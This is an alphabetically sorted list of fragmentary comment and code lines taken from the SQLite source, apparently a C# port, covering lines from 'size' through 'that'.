 size - 1) >= usableSize)
 size <= usableSize 
 size <= usableSize)
 size == usableSize)
 size as a single disk sector. See also setSectorSize().
 size give above.
 size limit) then no memory allocation occurs.  If the string can be
 size may be different to the source page size.
 size of a cell stored within an internal node is always less than 1/4
 size of all cells on the i-th page and cntNew[] which is the index
 size of an AS clause in the result-set of a SELECT.  The Z expression
 size of each lookaside buffer slot and the second is the number of
 size of each lookaside buffer slot and the third argument is the number of
 size of pPager.sectorSize bytes.
 size of the allocation is sizeof(PgHdr1)
 size of the file.
 size supplied does not meet this constraint then the page size is not
 size to hold everything except for the zero-filled tail.  If buf[]
 size)
 size) <= pPage.pBt.usableSize)
 size.
 sizeof(
 sizeof( Mem
 sizeof( Mem ) 
 sizeof( Op ) )
 sizeof( VdbeCursor
 sizeof( WhereLevel ) )
 sizeof( char
 sizeof( double ) == 8 )
 sizeof( int ) )
 sizeof( u32 )
 sizeof( u32 ) ) ) / 4 ) 
 sizeof( u32 )]
 sizeof(Mem)
 sizeof(PagerSavepoint))
 sizeof(i64) == 4)
 sizeof(p.a[0]) 
 sizeof(struct AuxData)
 sizeof(u64) == 4)
 sizes as reported by the xSize method in [sqlite3_mem_methods].</dd>
 sizes of memory allocations below this value where possible.
 skipKey==1.  The number of bytes of available key/data is written
 skipped and SQLITE_OK is returned.
 slightly faster.
 slot is expanded to two slots in order to make space for the
 slots allocated to each database connection.</dd>
 slots were available.
 slots.  The size of the buffer in the first argument must be greater than
 slow) general-purpose sqlite3GetVarint() routine to extract the
 so an insertion sort is an adequate algorithm here.
 so and false if not.
 so as not to burden production code.
 so far and none of the ORDER BY terms to the right reference other
 so forth.
 so is applicable.  Because this module is responsible for selecting
 so it is omitted there.  See ticket 
 so no mutex is required for access.
 so that INSERT can find the table easily.
 so that if the attempt to allocate a new buffer causes the the
 so that it is never used again.
 so that it maps to type 'eType' and parent page number 'pgno'.
 so that no further harm will be done.  Perhaps the next
 so that none of them try to use the data at which they
 so that the [sqlite3_value] specified in the parameter may change or
 so that the cache is restored to its original state at the start of
 so that we can find it later using sqlite3MemSize().
 so we trust him.
 soft memory limit. The first argument is a pointer to a Pager object
 some architectures. Hence the ROUND8() below.
 some circumstances the associated metadata may be preserved. This may
 some extent by SQLITE_MAX_SQL_LENGTH. But sometime you might
 some other method is next invoked on the save virtual table cursor.
 some prepared statements internally.
 some way. This function figures out if this modification means the
 something other than == on a column in the single table.  The 1-bit
 something went wrong. clean up anything allocated. 
 sometimes grow into tens of thousands or larger.  The size of the
 sometimes used by extensions.
 soon as the connection is closed.
 sort orders.
 sortOrder == SQLITE_SO_ASC )
 sortOrderMask ) != 0 
 sorters that were left open.  It also deletes the values of
 sorting is occurring or not occurring at appropriate times.   This variable
 sorting step is required.
 sortitem 
 sortitem ::= expr 
 sortlist 
 sortlist ::= sortitem sortorder 
 sortlist ::= sortlist COMMA sortitem sortorder 
 sortorder ::= 
 sortorder ::= ASC 
 sortorder ::= DESC 
 source database have been modified. If page iPage has already been
 source file journal.c).
 source pager for the number of pages in the database.
 space          
 space at pSpace.  This space can be used to hold the returned
 space for the lookaside memory is obtained from sqlite3_malloc().
 space for token
 space in a page that can be consumed by a single cell for standard
 space is allocated for the fields below this point. An attempt to
 space on overflow pages while keeping the amount of local storage
 space to duplicate all Expr nodes in the tree formed by Expr.pLeft
 space.
 space. Memory cell (p.nMem) corresponds to cursor 0. Space for
 special OLD and NEW tables
 specific [error codes] that better describes the error.
 specific action but allow the SQL statement to continue to be
 specific grammar used by SQLite.
 specific to the win32
 specified by mask.
 specified by pIdxKey or intKey.   Return a success code.
 specified by some locales.
 specified by the blocked connections bundled together into an array.
 specified by zName and nName is not found and parameter 'create' is
 specified collation sequence names.
 specified for individual triggers steps is used.
 specified name exists 
 specified number of milliseconds before returning 0.
 specify the various kinds of tokens (terminals) that the parser
 specify which memory allocation subsystem to use.
 sqlite3 object.
 sqlite3.aVTrans array. Then clear the array itself.
 sqlite3.h.
 sqlite3.pDisconnect list is accessed only as follows:
 sqlite3.pSavepoint. The first element in the list is the most recently
 sqlite3AddColumn() function and friends to modify.  But modify
 sqlite3BackupUpdate() only.
 sqlite3BtreeCommitPhaseOne() routine does the first phase and should
 sqlite3BtreeCopyFile() is called.
 sqlite3BtreeCreateTable() with the BTREE_ZERODATA flag before
 sqlite3BtreeCursor() may return are SQLITE_EMPTY and SQLITE_OK. 
 sqlite3BtreeCursorSize() : 0 ) 
 sqlite3BtreeEnterAll() is invoked to set the BtShared.db variables
 sqlite3BtreeGetPageSize( pBt ) : 0
 sqlite3BtreeHoldsMutex( db.aDb[iDb].pBt ) )
 sqlite3BtreeHoldsMutex( pDb.pBt ) ) )
 sqlite3BtreeIsInBackup( pBt ) )
 sqlite3BtreeIsInBackup( pDb.pBt ) )
 sqlite3BtreeIsInReadTrans( db.aDb[1].pBt ) )
 sqlite3BtreeIsInTrans( p ) )
 sqlite3BtreeOpen() 
 sqlite3BtreeParseCellPtr() uses getVarint32() to extract the
 sqlite3BtreePutData()).
 sqlite3DeleteTable() when the Table structure itself is cleaned up.
 sqlite3EndTable will generate.
 sqlite3ExprIsConstant( pE2 ) == 0 )
 sqlite3ExprIsConstant( pExpr ) == 0 )
 sqlite3ExprIsConstant( pFarg.a[i].pExpr ) != 0 )
 sqlite3ExprIsConstantNotJoin( pWhere ) != 0 ) )
 sqlite3FindTable() does not.
 sqlite3FinishTrigger() function is called to complete the trigger
 sqlite3FixSrcList can never fail. 
 sqlite3GetFuncCollSeq() might be called 
 sqlite3GetVdbe cannot fail: VDBE already allocated 
 sqlite3GlobalConfig.bCoreMutex ){
 sqlite3GlobalConfig.inProgress == 0 )
 sqlite3GlobalConfig.m with pointers to the routines in this file.
 sqlite3GlobalConfig.nPage >= 1 )
 sqlite3GlobalConfig.nPage]
 sqlite3GlobalConfig.nScratch >= 0 )
 sqlite3GlobalConfig.nScratch]
 sqlite3GlobalConfig.pInitMutex == null )
 sqlite3GlobalConfig.szPage >= 512
 sqlite3GlobalConfig.szScratch >= 100
 sqlite3IoTrace is a pointer to a printf-like routine used to
 sqlite3IsAsciiIdChar[c - 0x20] )
 sqlite3IsAsciiIdChar[c - 0x20] ) ) 
 sqlite3IsAsciiIdChar[c - 0x20] ) ) )
 sqlite3IsAsciiIdChar[c-0x20]))
 sqlite3IsEbcdicIdChar[c-0x40]))
 sqlite3IsIdChar[X] must be 1.
 sqlite3IsMemJournal( pPager.sjfd ) )
 sqlite3IsNumericAffinity(aff2))
 sqlite3IsRowid( zCol ) )
 sqlite3Isdigit( zDate[zIndex 
 sqlite3Isdigit( zDate[zIndex] )
 sqlite3Isdigit( z[iOffset 
 sqlite3Isdigit( z[zIndex] ) ) { zIndex 
 sqlite3Isspace(
 sqlite3Isspace( zSql[zindex] ) ) zindex
 sqlite3Isspace( z[iOffset 
 sqlite3Isspace( z[n - 1] ) ) { n--
 sqlite3Isspace(z[i])
 sqlite3Malloc() or sqlite3_malloc().
 sqlite3Malloc() to obtain space for the file-handle structure.
 sqlite3MemMalloc().
 sqlite3MutexInit().
 sqlite3OpenTempDatabase( pParse ) != 0 )
 sqlite3OsEnterMutex() hasn't been called yet.
 sqlite3OsLock().
 sqlite3OsLock(). The various locks exhibit the following semantics:
 sqlite3OsOpen() fails.
 sqlite3OsWrite() function.
 sqlite3PagerIsMemdb( sqlite3BtreePager( p.pDest ) ) )
 sqlite3PagerIswriteable(pPage.pDbPage) )
 sqlite3PagerIswriteable(pToRelease.pDbPage))
 sqlite3PagerPageRefcount(pPage.pDbPage) > 1)
 sqlite3PagerPagecount() call above cannot fail. 
 sqlite3PagerRollback() because this function does not terminate
 sqlite3PagerRollback().
 sqlite3PagerSetBusyhandler().
 sqlite3PagerTruncateImage() here so that any pages in the
 sqlite3PagerUnref() on the new page when it is done.
 sqlite3PagerVfs(pBt.pPager)==pVfs ){
 sqlite3PcachePagecount( pPager.pPCache ) > 0 )
 sqlite3PcacheRefCount( pPager.pPCache ) == 0
 sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
 sqlite3RegisterDateTimeFunctions() found at the bottom of the file.
 sqlite3ReleaseTempRange(). So in some ways having the OP_IsUnique
 sqlite3ResolveOrderGroupBy() will convert the expression to a
 sqlite3SafetyCheckOk() requires that the db pointer be valid for
 sqlite3SafetyOff() below will change the value back to SQLITE_MAGIC_OPEN
 sqlite3SelectExpand() called on this 
 sqlite3SelectExpand() prior to invoking this routine.
 sqlite3SelectNew() guarantees this 
 sqlite3SelectPrep() do all of the processing for this SELECT.
 sqlite3SelectPrep() will invoke both sqlite3SelectExpand() and
 sqlite3StrICmp((x)
 sqlite3Strlen30( pColl.zName ) )
 sqlite3Strlen30( zToken ) : 0
 sqlite3Strlen30(pDef->zName) 
 sqlite3Strlen30(sqlite3_errmsg(db))
 sqlite3TempInMemory( db ) )
 sqlite3UpperToLower[
 sqlite3VdbeAddOpList() knows that the address is relative.  Calling
 sqlite3VdbeDeleteUnpackedRecord().
 sqlite3VdbeExec() or since last time the progress callback was called).
 sqlite3VdbeMakeReady() must be called before this routine in order to
 sqlite3VdbeMakeReady() to size the Vdbe.apArg[] array.
 sqlite3VdbeMemExpandBlob( P ) : 0
 sqlite3VdbeMemFromBtree() call above) then transfer control of that
 sqlite3VdbeMemGrow() could clobber the value before it is used).
 sqlite3VdbeMemHandleBom(pMem)!=0 ){
 sqlite3VdbeMemMakeWriteable( pOut ) != 0 ) { goto no_mem
 sqlite3VdbeMemMakeWriteable(P) ){ goto no_mem
 sqlite3VdbeMemNulTerminate( pMem ) != 0 )
 sqlite3VdbeParseRecord.
 sqlite3VdbeSerialGet()
 sqlite3VdbeSerialLen()
 sqlite3VdbeSerialPut()
 sqlite3VdbeSerialType()
 sqlite3VdbeSerialTypeLen( serial_type1 ) > 0 ) break
 sqlite3VdbeSerialTypeLen()
 sqlite3VdbeSetColName() installs column names as UTF8
 sqlite3ViewGetColumnNames() would have picked up the error.
 sqlite3WhereBegin() for additional information.
 sqlite3WhereBegin() routine.  So we know that the pMaskSet.ix[]
 sqlite3WhereEnd will have created code that references the table
 sqlite3_backup_finish() functions to perform the specified backup 
 sqlite3_backup_finish() is called or the backup operation is complete 
 sqlite3_backup_finish().
 sqlite3_backup_finish(). Unfortunately SQLite does not currently check
 sqlite3_backup_init() identify the [database connection]
 sqlite3_backup_init() is called and before the corresponding call to
 sqlite3_backup_pagecount().
 sqlite3_backup_step() call returns. Because the source database is not
 sqlite3_backup_step() can be retried later. If the source
 sqlite3_backup_step() then [SQLITE_NOMEM] or an
 sqlite3_backup_step(). If the source database is modified during a backup
 sqlite3_backup_step(). The user is required to ensure that no
 sqlite3_bind_
 sqlite3_bind_  
 sqlite3_bind_text16() is a destructor used to dispose of the BLOB or
 sqlite3_blob_open().
 sqlite3_changes() on the database handle 'db'.
 sqlite3_collation_needed16().  The second argument is the database
 sqlite3_column_  
 sqlite3_column_bytes16() to find the size of the result.  Do not mix calls
 sqlite3_column_name() or sqlite3_column_name16() on the same column.
 sqlite3_column_text16() failed.  
 sqlite3_column_text16() may be invalidated.
 sqlite3_config() before SQLite will operate.
 sqlite3_config() shall return SQLITE_MISUSE if it is invoked while
 sqlite3_context object.  A pointer to an sqlite3_context object
 sqlite3_context_db_handle( context ).mallocFailed != 0
 sqlite3_context_db_handle() function returns (void 
 sqlite3_create_collation only 
 sqlite3_create_function only 
 sqlite3_create_module_v2() interfaces.
 sqlite3_db_config() interface can only be used immediately after
 sqlite3_errcode() is undefined.  The sqlite3_extended_errcode()
 sqlite3_errmsg() and sqlite3_errcode().
 sqlite3_file for win32.
 sqlite3_free(P) where P is the first parameter to sqlite3_realloc().
 sqlite3_free(ref pCur)
 sqlite3_initialize() and sqlite3_shutdown().  The sqlite3_os_init()
 sqlite3_initialize() being called. This block copies pointers to
 sqlite3_initialize().  The recursive calls normally come through
 sqlite3_io_error_hit) 
 sqlite3_io_error_hit.iValue != 0 )
 sqlite3_io_error_pending-- == 1 )  
 sqlite3_io_error_pending.iValue-- == 1 )
 sqlite3_last_insert_rowid() function (otherwise it is unmodified).
 sqlite3_libversion_number() always returns the value
 sqlite3_libversion_number() to make sure that the API they
 sqlite3_libversion_number() to make sure they are dealing with
 sqlite3_malloc() 
 sqlite3_malloc() and pointed to by zMasterJournal.
 sqlite3_malloc() is zero or negative then sqlite3_malloc() returns
 sqlite3_malloc(N) where N is the second parameter to sqlite3_realloc().
 sqlite3_mem_methods
 sqlite3_mem_methods structure fails to allocate a block of memory
 sqlite3_mutex_enter() will block and sqlite3_mutex_try() will return
 sqlite3_mutex_held( db.mutex ) )
 sqlite3_mutex_held( p.db.mutex ) )
 sqlite3_mutex_held( pFrom.db.mutex ) )
 sqlite3_mutex_held( pMem.db.mutex ) )
 sqlite3_mutex_held( pTo.db.mutex ) )
 sqlite3_mutex_held( pVal.db.mutex ) )
 sqlite3_mutex_held(p->db->mutex) )
 sqlite3_mutex_held(p->pBt->mutex) )
 sqlite3_mutex_held(p.db.mutex))
 sqlite3_mutex_held(pMem.db.mutex) )
 sqlite3_mutex_methods
 sqlite3_mutex_try() as an optimization so this is acceptable behavior.
 sqlite3_open() and sqlite3_open16().</dd>
 sqlite3_open() and sqlite3_open_v2() and as UTF-16 in the native byte
 sqlite3_open() or sqlite3_open_v2() is called and
 sqlite3_open() or sqlite3_open_v2().
 sqlite3_open().
 sqlite3_os_end() is called by sqlite3_shutdown().  Appropriate
 sqlite3_os_init() and sqlite3_os_end().  An application-supplied
 sqlite3_pcache Methods 
 sqlite3_pcache interface). It also contains part of the implementation
 sqlite3_pcache object except by holding and passing pointers
 sqlite3_pcache_methods
 sqlite3_prepare_v2() to reprepare a statement after a schema change.
 sqlite3_query_plan[nQPlan-1]==' ' ){
 sqlite3_random() 
 sqlite3_realloc() returns a pointer to a memory allocation
 sqlite3_realloc.
 sqlite3_result_  
 sqlite3_result_error16() is non-negative then SQLite takes that many
 sqlite3_result_value() interface makes a copy of the [sqlite3_value]
 sqlite3_set_auxdata() API may be safely retained until the next
 sqlite3_snprintf() works like snprintf() except that it ignores the
 sqlite3_step() has another row ready 
 sqlite3_step() has finished executing 
 sqlite3_step() is called again to retrieve the next row of data.
 sqlite3_step() verifies this 
 sqlite3_stmt 
 sqlite3_unlock_notify() method with the blocked connection handle as 
 sqlite3_unlock_notify() results in the unlock-notify callback being
 sqlite3_value object but no mutex is held for an unprotected
 sqlite3_value object.  If SQLite is compiled to be single-threaded
 sqlite3_value objects even when not strictly required.
 sqlite3_value objects.
 sqlite3_value_  
 sqlite3_value_text16be() and sqlite3_value_text16le() interfaces
 sqlite3_value_type( argv[2] ) == SQLITE_NULL )
 sqlite3_value_type()] family of
 sqlite3_vtab
 sqliteDeleteIndex() when the Index structure itself is cleaned
 sqliteRegisterBuildinFunctions() found at the bottom of the file.
 sqlite_detach() or sqlite_attach() SQL user functions.
 sqlite_master table (because some other process changed the schema) and
 sqlite_master table returns SQLITE_EMPTY.
 sqlite_master table. Otherwise SQLITE_OK.
 sqlite_sequence table and store it in memory cell regAutoinc.
 sqlite_stat1 table.
 sqlite_temp_master if required.
 srcType == MEM_Static )
 stack every overflows 
 stack if the top N elements are not distinct.
 stack into the sorter.
 start and end terms (pRangeStart and pRangeEnd).
 startEq 
 started.
 started.  Index 0 is the main database file and index 1 is the
 starting at pDest.iMem.  Then the co-routine yields.
 starting at regBase.
 starts the transactions will be coded and the OP_Goto P2 value
 state of SQLite and to inject faults into SQLite for testing
 state of the virtual machine.
 statement (configured by calls to sqlite3TableLock()).
 statement and try to run it again.  If the schema has changed in
 statement be resolved.
 statement in which the function is running.
 statement is a simplification of:
 statement is completely executed or an error occurs.
 statement is that the table name is the first non-space token that
 statement is that the table name is the first token that is immediatedly
 statement might be reprepared during [sqlite3_step()] due to a 
 statement pStmt.
 statement that defines the view.
 statement that does not return data (for example an [UPDATE]).
 statement to populate the new table. The root-page number for the
 statement transaction is commtted.
 statement transaction that should be closed here. The only exception
 statement we must not write to the original database unless we know
 statement were is processed.
 statement within the body of the same trigger.
 statement.
 statement.   This instruction is also used to implement the
 statement.  If the statement is not a [COMMIT] and occurs within a
 statement.  This is the normal case.
 statement. The second is a table name. The table name in the CREATE
 statements (i.e. open read/write incremental blob handles).
 statements are evaluated and the database is not changed.
 statements to find locking problems.
 statements).
 statements.
 states:
 static array using sqlite3VdbeAddOpList but we want to make a
 static links that do not use it.
 static mutex MUTEX_STATIC_LRU 
 step can be skipped.
 step.
 still exceed Robson memory allocation limits on some configurations.
 still make the distinction between between protected and unprotected
 still short of its goal.  The following chart shows the allowed
 stl_prefix 
 stl_prefix ::= 
 stl_prefix ::= seltablist joinop 
 storage space.
 store NULL in paCol and 0 in pnCol and return SQLITE_NOMEM.
 store the answer in register P3.
 store the result in register P3.
 store the results in the appropriate memory cell and break out
 stored as a member of the Table structure for subsequent use.
 stored by this function into the database handle using sqlite3Error().
 stored entirely within the b-tree page by inspecting the first
 stored in MemPage.pBt.mutex.
 stored in a WhereClause structure containing within the WhereOrInfo
 stored in aConstraint[].op.  The index of the column is stored in
 stored in database handle pDestDb.
 stored in memory that the caller has obtained from sqlite3Malloc. The
 stored in place of an 8-byte floating point value in order to save
 stored in the cache supplied as an argument.
 stored in the database file.
 stored in the database header.
 stores a single value in the VDBE.  Mem is an opaque structure visible
 stores the integer key in pCur.nKey. In this case this value is
 strategies are appropriate.
 strategy.
 strerror_r() on unix). After an error is returned by an OS
 strictly necessary.
 string after SQLite has finished with it. If the fifth argument is
 string for index pIdx. A column affinity string has one character
 string for table pTab. A column affinity string has one character
 string from the argument list.  But %q also doubles every '
 string indicates the column affinity that should be used for the nth
 string is 
 string is copied into a (possibly existing) buffer managed by the
 string is defined.)
 string literals or quoted identifier names or comments are not
 string obtained from [sqlite3_mprintf()] to zErrMsg.  The method should
 string of its 2nd parameter.  It returns a result table to the
 string or a comment) then 
 string pointer 
 string representation as returned by [sqlite3_column_text()].
 string will be freed automatically when the table is
 string zEnd
 string zSep2
 strings and blobs static.  And none of the elements are
 strings and strings are considered less than blobs.
 strings so there is no way for sqlite3_column_name() to fail. 
 struct Trigger.
 struct as its argument.
 structure
 structure are known.
 structure being xDisconnected and free). Any other VTable structures
 structure built up in pParse.pNewTable. The calling code (see vtab.c)
 structure contains a single instance of this structure.  This structure
 structure for each database connection (sqlite3
 structure is appended and initialized to zero.  This structure stores
 structure is associated with a single sqlite3
 structure is filled with the currently defined memory allocation routines.
 structure is filled with the currently defined mutex routines.
 structure is generated based on the information available and stored
 structure that SQLite will ever modify.  SQLite will only access
 structure that specifies the function.  Use register
 structure to provide access to the top P1 values as the result
 structure used by this VFS.  mxPathname is the maximum length of
 structure.
 structure.  A pointer to this structure is stored in the sqlite.aFunc
 structure.  All elements are stored on a single doubly-linked list.
 structure.  Used for testing and debugging only.  If neither
 structure. A buffer of PgHdr1.pCache.szPage bytes is allocated
 structures that would not normally fit on the stack of an
 structures.  The xShutdown method is invoked (indirectly) by
 stub function.  You will lose timing support for many
 sub-algorithm in some documentation.
 sub-bitmaps pointed to by Bitvec.u.apSub[].  Each subbitmap
 sub-dividing and re-hashing. 
 sub-journal now. This is required to handle the following scenario:
 sub-journal rolled back the content could not be restored and the
 sub-query that appears instead of a real table name in the FROM clause
 sub-system. It doesn't matter if the journal-file is not properly
 sub-tree headed by the child page of the cell being deleted. This makes
 subexpression and populate all the other fields of the WhereTerm
 subexpression is separated by an AND operator.
 subjInMemory
 subjRequiresPage( pPg )
 subject to the following qualifications:
 subjournalPage() may need to allocate space to store pPg.pgno into
 subqueries 
 subqueries looking for a match.
 subquery
 subquery in the parser tree.
 subquery until code generation is
 subqueryIsAgg )
 subqueryIsAgg ) return 0
 subsequent API calls on this Pager will immediately return the same
 subsequent Btrees that desire a lock.
 subsequent calls to other SQLite interface functions.
 subsequent malloc failures are benign. A call to sqlite3EndBenignMalloc()
 substitute integer for floating-point
 substitute integer for floating-point.
 substitute.
 substrings in the following table. If one of the substrings is
 subsubterms at least one of which is indexable.  Indexable AND
 subsystem cannot be initialized.
 subsystem is initialized prior to invoking sqliteRealloc.
 subsystem.
 subsystem.  See comments in the source code for a detailed description
 subsystem.  The page cache subsystem reads and writes a file a page
 subterms have their eOperator set to WO_AND and they have
 subterms.  So in:
 subtle problems on some systems that could cause problems.  It is hard
 subtree components
 success.
 success/failure code that describes the result of executing the virtual
 successful [INSERT] and does not change the value returned by this
 successful [INSERT] into the database from the [database connection]
 successful call to sqlite3_backup_init().
 successful coding of the SELECT.
 successful here.
 successful or hit an 'OR FAIL' constraint. This means a commit
 successful then set pRes=0.  If the cursor
 successfully opened [BLOB handle] in its only argument.  The
 successfully.  An [error code] is returned otherwise.
 successfully.  sqlite3_step() should not be called again on this virtual
 successors.
 successors.  The result of the function is stored in register P3.
 such a conversion is possible without loss of information (in other
 such a system. This is currently an undocumented limit.
 such as is generated by the OP_MakeRecord opcode.  Unpack the
 such behavior in its own use of mutexes.
 such savepoints while the statement transaction savepoint is active.
 such table and column.  Set okToChngToIN if an appropriate table
 sufficient storage to hold a cursor.  The BtCursor object is opaque
 suggested initial array size allocation.
 suggested maximum cache-size (number of pages stored by) the cache
 suitable for use as a data record in a database table or as a key
 suitable state to query for the column names and types to be used
 sum() or avg() aggregate computation.
 supplied to use for the page-cache by passing the SQLITE_CONFIG_PAGECACHE
 support for additional result codes that provide more detailed information
 supported:
 sure all indices labeled OE_Replace come after all those labeled
 sure pPage1.aData is set correctly. 
 sure the Pager.needSync flag is set too.
 sure the same column is used on all terms.  The 2-bit case is when
 surround the body of the token are removed.
 switch.  The following code should catch this problem at compile-time.
 switch.  yygotominor is uninitialized when a rule reduces that does
 symbol.  The symbol can be either a terminal or nonterminal.
 symbols in sqliteInt.h correspond to
 sync operation only needs to flush data to mass storage.  Inode
 sync the database file before calling CommitPhaseTwo() to delete the
 sync()ed before any data is written to database file page needSyncPgno.
 synced to disk.  Compute the number of pages based on the remaining
 synced to disk. The journal file still exists in the file-system
 synchronization. Though they are intended for internal
 synchronous setting.  A negative value means synchronous is off
 system 
 systems that do not need this facility may omit it by recompiling
 sz 
 sz - 1 ) / sz
 sz <= pPage.pBt.usableSize)
 sz == pPage.pBt.usableSize)
 sz == usableSize)
 sz > iLimit )
 sz > pPage.pBt.usableSize)
 sz > usableSize)
 sz)
 szCell 
 szCell[d] 
 szEntry)
 szJ < 16
 szJ == 0 )
 szLookaside 
 szNew[4] : 0)
 szOsFile 
 szPage 
 szRight 
 szScratch 
 t )
 tab1 and tab2 may not be the same table 
 tab1 must not be a virtual table 
 tab1 must not have triggers 
 tab2 may not be a view 
 tab2 must be NOT NULL if tab1 is 
 tab2 must not be a virtual table 
 tab2 over to tab1.  The columns are not decoded.  Raw records from
 table 
 table (either directly or through triggers) needs to call this
 table allocated and opened above.
 table and column is common to every term in the OR clause 
 table and column.
 table and for temporary tables.  The SQLITE_DEFAULT_CACHE_SIZE
 table and stores that cursor in P1.
 table and the first matching index is returned.  (No checking
 table column affinities.
 table given the name of that table and (optionally) the name of the
 table iParm.
 table implementation have an opportunity to overload the function.
 table in the result set of a select.  We do not have a good way
 table in which database a result of a [SELECT] statement comes from.
 table is about to be deleted. In this case invalidate all incrblob
 table is deleted automatically when the cursor is closed.
 table is the last entry.  The join operator is held in the entry to
 table module.  This routine is really just a wrapper that sets up
 table on the right 
 table or index.  If there are no more key/value pairs then fall through
 table or index.  If there is no previous key/value pairs then fall through
 table pTab and store the column value in a register.  An effort
 table structure with all its indices and foreign keys.
 table support is omitted from the build.
 table that cursor P1 points to.  The new record number is written
 table that stores the new.
 table.
 table.  
 table.  Memory to hold the text of the statement is obtained
 table. Don't do this if the table being ALTERed is itself located in
 table. Set the offset for any extra columns not present in
 table. The program name loops through the master table and deletes
 tables in a join to 32 instead of 64.  But it also reduces the size
 tables in the FROM clause is limited by a test early in the
 tables in the db.aVTrans[] array. The following sqlite3VtabRollback()
 tables respectively. If column N of the
 tables.
 take care that any prior string is freed by a call to [sqlite3_free()]
 take the conservative approach and always do range tests
 take the jump (since there are no records in the table).
 take the jump if the jumpIfNull flag is SQLITE_JUMPIFNULL.
 take the performance hit.
 takes a pointer to the body of the cell as its second argument.
 takes care of the master journal trickery.
 taking up data space with information that will never be used. 
 target    -> A token holding the quoted name of the table to delete from.
 target    -> A token holding the quoted name of the table to insert into.
 target    -> A token holding the quoted name of the table to update rows of.
 target <= pParse.nMem )
 tcons ::= CHECK LP expr RP onconf 
 tcons ::= FOREIGN KEY LP idxlist RP REFERENCES nm idxlist_opt refargs defer_subclause_opt 
 tcons ::= PRIMARY KEY LP idxlist autoinc RP onconf 
 tcons ::= UNIQUE LP idxlist RP onconf 
 temp ::= 
 temp ::= TEMP 
 temp table in the case of row triggers.
 tempFile != 0 )
 tempFile == PAGER_LOCKINGMODE_EXCLUSIVE )
 template.  This is the 2nd template.
 templates:
 temporary database never needs to be committed.
 temporary file directory.
 temporary file name to use
 temporary files.
 temporary table. 
 temporary tables needed to implement the compound select.
 temporary tables.
 temporary triggers on table pTab from the sqlite_temp_master table. If
 term 
 term ::= CTIME_KW 
 term ::= INTEGER
 term ::= NULL 
 term ::= STRING 
 term added.
 term can be either X=expr or X IN (...).   pTerm is the term to be
 term for the DELETE or UPDATE statement.  For example:
 terminal or non-terminal is destroyed.  This can happen
 terms in the where clause.
 terms of the WHERE clause that use only terms in that loop and outer
 terms to the ORDER BY clause as necessary.
 terms.
 test builds.
 test case misc2.2.2) - it always evaluates to NULL.
 test for the presence of zFile. This is because any IO error that
 test is related to ticket 
 test more often than is necessary.
 testcase( db==0 )
 testcase( z[0] == '1' )
 testcase( z[0] == '2' )
 testcase( z[0] == '4' )
 testcase( z[0] == '5' )
 testcase( z[0] == '7' )
 testcase( z[0] == '8' )
 testcase( z[0] == ':' )
 testcase( z[0] == '@' )
 testcase( z[0] == 'X' )
 testcase() must be evaluated both true and false in order to
 testing and analysis only.
 testing and debugging only.
 testing purposes only.  These variables do not exist in
 testing:
 tests.  Enable the expensive asserts using the
 text encoding 
 text encoding] this SQL function prefers for
 text encodings supported by SQLite.
 text of name of TABLE 
 text z[0..n-1] into register iMem.
 than 1 GiB.  The sqlite3_test_control() interface can be used to
 than 19 digits (thus guaranting that it is too large) 
 than 1GiB) the value returned might be less than the true string length.
 than 2GiB are support - anything large must be database corruption.
 than Key(0).  All of the keys on page Ptr(1) and its subpages have
 than Pager.journalOff bytes. If the next thing in the journal
 than being distinct from one another.
 than the actual length of the string.  For very long strings (greater
 than the one containing the application-defined function that received
 than the source table 
 than the writer must be about to drop to zero. In this case
 that
 that BitvecClear can use to rebuilt its hash table.
 that Btree might have been modified so that the cursor
 that SQLite uses internally when comparing identifiers.
 that SQLite uses to interact
 that a Mem structure is located on an 8-byte boundary. To prevent
 that actually made the VACUUM run slower.  Very little journalling
 that all locks will fit on a single page even at the minimum page size.
 that any TEXT or BLOB content is stored in memory obtained from
 that appear in the original SQL statement after the LIMIT and OFFSET
 that are applied:
 that are contained within a BEGIN...COMMIT block.  If a constraint
 that are started after the running statement count reaches zero are
 that are started after the sqlite3_interrupt() call and before the 
 that are started after the sqlite3_interrupt() call returns.
 that are used as an unpacked index key.
 that both the BtShared and database handle mutexes are held. 
 that btreeParseCellPtr() and sqlite3GetVarint32() are implemented 
 that can be associated with a constant argument to a function.  This
 that can be lowered at run-time using [sqlite3_limit()].
 that can be returned by [sqlite3_status()].
 that can be stored in a database table. SQLite uses dynamic typing
 that can be stored in a u32 without loss of data.  The value
 that column.
 that columns affinity when building index keys. If <expr> is not
 that comment is used to determine the particular value of the opcode.
 that connection p holds the required locks to read or write to the
 that contains table p is held by the caller. See header comments 
 that contains the typename of the column and store that string
 that created confusion with the whole virtual-table idea.
 that created the expression.
 that deal with sqlite3StackAlloc() failures to be unreachable.
 that define the range that the BETWEEN implements.  For example:
 that defines the format of keys in the index.
 that divide the siblings. An attempt is made to find NN siblings on
 that does error checking on mutexes to make sure they are being
 that does no originate from the ON or USING clauses of a join.
 that does no real locking and is appropriate for use in
 that does not care about crash recovery or rollback might make
 that early versions of GCC stored the two words of a 64-bit
 that extra information.
 that fire off of pTab.  The list will include any TEMP triggers on
 that follows does not appear in normal builds.
 that form the result set of a SELECT statement) compute appropriate
 that have not been defined by sqlite3_create_collation() etc.
 that have occurred since the specified savepoint was created.
 that header file is associated.
 that holds the maximum rowid.
 that immediately follows the page header.  Cells is not necessarily
 that implements the ALTER TABLE command.
 that implements the [SELECT] statement. The second parameter is the
 that is N bytes long.
 that is a lot of wasted space on the left margin.  So the code within
 that is a part of a trigger-program.
 that is attempted.
 that is automatically destroyed when it is closed.
 that is currently pointing to a row in a (non-empty) table.
 that is in the FROM clause of the aggregate query.
 that is input to this routine is automatically freed.
 that is invoked to authorize certain SQL statement actions.  The
 that is returned (the [sqlite3_stmt] object) contains a copy of the
 that is used to store tables create using CREATE TEMPORARY TABLE.
 that it does not get written to disk.
 that it has not been previously stressed...  (SQLite ticket 
 that it is designed to be called by internal code. The difference is
 that it is not already a part of the list.
 that it is really required before calling this function.
 that it might be reused.  The sqlite3_free() routine is
 that it points at iFreePage. Also fix the pointer map entry for
 that it points to iTo. Parameter eType describes the type of pointer to
 that it returns NULL if it sums over no inputs.  TOTAL returns
 that look like this:   
 that make up an unpacked index key that can be used with cursor P1.
 that make up the Pager sub-system API. See source code comments for
 that make up the compound SELECT are allowed to be aggregate or distinct
 that may be accessed by the VM passed as an argument. In doing so it
 that means that a mutex could not be allocated.
 that means that a mutex could not be allocated.  SQLite
 that means that a mutex could not be allocated. {H17013} SQLite
 that memory location as needed.
 that name in the set of source tables in pSrcList and make the pExpr
 that need expanding.
 that occur while the cursor is on the null row will always
